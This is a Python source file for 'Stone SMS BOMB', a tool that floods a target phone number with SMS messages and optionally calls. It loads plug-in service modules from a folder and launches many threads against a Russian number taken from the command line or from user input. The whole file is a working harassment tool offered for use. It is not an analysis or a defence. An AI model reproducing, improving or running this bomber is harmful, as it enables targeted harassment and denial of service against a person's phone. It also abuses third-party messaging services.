#
# Stone SMS BOMB
#   by 100LAR
#

ver = "0.1.3"

import inspect
import logging
import os
import socket
import sys
import threading
import webbrowser

import configparser

if not os.path.exists("settings.txt"):
    config = configparser.ConfigParser()
    config.add_section("Settings")
    config.set("Settings", "call", "False")
    config.set("Settings", "service-path", "services")
    config.set("Settings", "list-importing", "False")
    with open("settings.txt", "w") as config_file:
        config.write(config_file)

config = configparser.ConfigParser()
config.read("settings.txt")
send_calls = config.get("Settings", "call")
send_calls_bool = True if send_calls == "true" or send_calls == "True" else False

service_path = config.get("Settings", "service-path")
list_importing = config.get("Settings", "list-importing")
list_importing_bool = True if list_importing == "true" or list_importing == "True" else False

services = os.listdir(service_path)
service_classes = {}
sys.path.insert(0, service_path)

print("""
   _____ _                      _____ __  __  _____   ____   ____  __  __ ____  
  / ____| |                    / ____|  \/  |/ ____| |  _ \ / __ \|  \/  |  _ \ 
 | (___ | |_ ___  _ __   ___  | (___ | \  / | (___   | |_) | |  | | \  / | |_) |
  \___ \| __/ _ \| '_ \ / _ \  \___ \| |\/| |\___ \  |  _ <| |  | | |\/| |  _ < 
  ____) | || (_) | | | |  __/  ____) | |  | |____) | | |_) | |__| | |  | | |_) |
 |_____/ \__\___/|_| |_|\___| |_____/|_|  |_|_____/  |____/ \____/|_|  |_|____/ """)
print("\nVersion : "+ver+"\n")

def import_services():
    for service in services:
        if service.endswith('.py') and service != 'service.py':
            module = __import__(service[:-3])
            if list_importing_bool:
                print(str(module))
            for member in inspect.getmembers(module, inspect.isclass):
                if member[1].__module__ == module.__name__:
                    service_classes[module] = member[0]

        

def run_service(service_class, module_, phone, country_code, phone_code, sms_text, type_):
    try:
        if type_ == 'call':
            getattr(module_, service_class)(phone, [country_code, phone_code], sms_text).send_call()
        else:
            getattr(module_, service_class)(phone, [country_code, phone_code], sms_text).send_sms()
        sys.exit()
    except:
        pass
        

def start_bomb():
    send_calls_bool = True if send_calls == 'true' or send_calls == 'True' else False
    for _ in range(int(count)):
            for module_, service_class in service_classes.items():
                try:
                    _ = getattr(module_, service_class).send_call
                    if send_calls_bool:
                        threading.Thread(target=run_service,
                                            args=(service_class, module_, phone, country_code, phone_code, sms_text,
                                                'call')).start()
                except AttributeError:
                    threading.Thread(target=run_service, args=(service_class, module_, phone, country_code, phone_code, sms_text, 'sms')).start()

try:
    if sys.argv[1] == "--help":
        print("\nSTONE SMS BOMBER v"+ver)
        print("\nSMS_BOMBER.py <phone> <count>")
    else:
        import_services()
        phone = sys.argv[1]
        if len(phone)> 10:
            phone = phone[len(phone)-10:]
        try:
            count = sys.argv[2]
        except:
            count = 1
        country_code = 'ru'
        phone_code = '7'
        sms_text = 'test'
        start_bomb()
except:
    print("Import services...")
    import_services()
    print("Services : " + str(len(service_classes) ) ) 
    phone = input("\nPhone : +7")
    count = input("Count : ")
    print("\nMessages ~ " + str(len(service_classes) * int(count)))
    country_code = 'ru'
    phone_code = '7'
    sms_text = 'test'
    start_bomb()
    print("\nAll services started\nPlease wait...")
    

                                        
                                          


